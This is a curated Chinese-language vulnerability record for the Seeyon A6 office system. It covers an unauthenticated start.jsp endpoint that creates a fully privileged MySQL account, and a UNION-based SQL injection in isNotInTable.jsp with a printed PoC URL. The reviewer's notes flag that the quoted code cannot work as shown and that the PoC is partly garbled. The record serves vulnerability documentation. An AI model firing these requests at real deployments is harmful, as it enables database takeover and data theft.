---
source: "hatch 补库批 20260928"
title: "致远A6 start.jsp数据库账户重置及isNotInTable.jsp SQL 注入"
product: "致远A6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A6；MySQL用户管理高权限"
prerequisites: "正文声称无权限验证"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20%E9%87%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E.md"
id: "vw-fcfe600f7b947be5feece8de"
entity_id: "ve-fcfe600f7b947be5feece8de"
schema_version: "1"
---

# 致远A6 start.jsp数据库账户重置及isNotInTable.jsp SQL 注入

## 条目说明

- 对象与具体问题：致远A6；start.jsp数据库账户重置及isNotInTable.jsp SQLi
- 版本、配置及部署条件：A6；MySQL用户管理高权限
- 认证与权限前提：正文声称无权限验证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 一文两个独立漏洞，不能单一密码重置标题吞掉SQLi
- 所列代码conn=null且获取连接已注释，conn.prepareStatement必空指针，因此该片段不支持实际重置成功
- 后半POC混入JSON响应，URL未编码空格；需独立请求响应与来源
- 创建/重置byoa并grant全权限严重持久副作用，不能列防御操作

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

#### 重置数据库账号密码防御

    http://www.0-sec.org/yyoa/ext/byoa/start.jsp

该文件的代码为：

    <%    Connection conn = null;    PreparedStatement pstmt = null;    String sql = "create user byoa IDENTIFIED by 'byoa'";    try {        conn = null;//net.btdz.oa.common.ConnectionPoolBean.getConnection();        pstmt = conn.prepareStatement(sql);        out.print(pstmt.executeUpdate());        sql = "grant all on *.* to byoa";        pstmt = conn.prepareStatement(sql);        out.println(pstmt.executeUpdate());        pstmt.close();        sql = "update mysql.user set password=password('byoa') where user='byoa'";        pstmt = conn.prepareStatement(sql);        out.println(pstmt.executeUpdate());        pstmt.close();        sql = "flush privileges";        pstmt = conn.prepareStatement(sql);        out.print(pstmt.executeUpdate());        pstmt.close();        //conn.close();    } catch (Exception ex) {                    out.println(ex.getMessage());    }%>

可以抛光该文件没有验证任何权限，便进行了重置数据库用户byoa的密码为：byoa

#### mysql + jsp注射

    http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp

#### poc

    http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select user()%23{'success':false,'errors':'root@localhost'
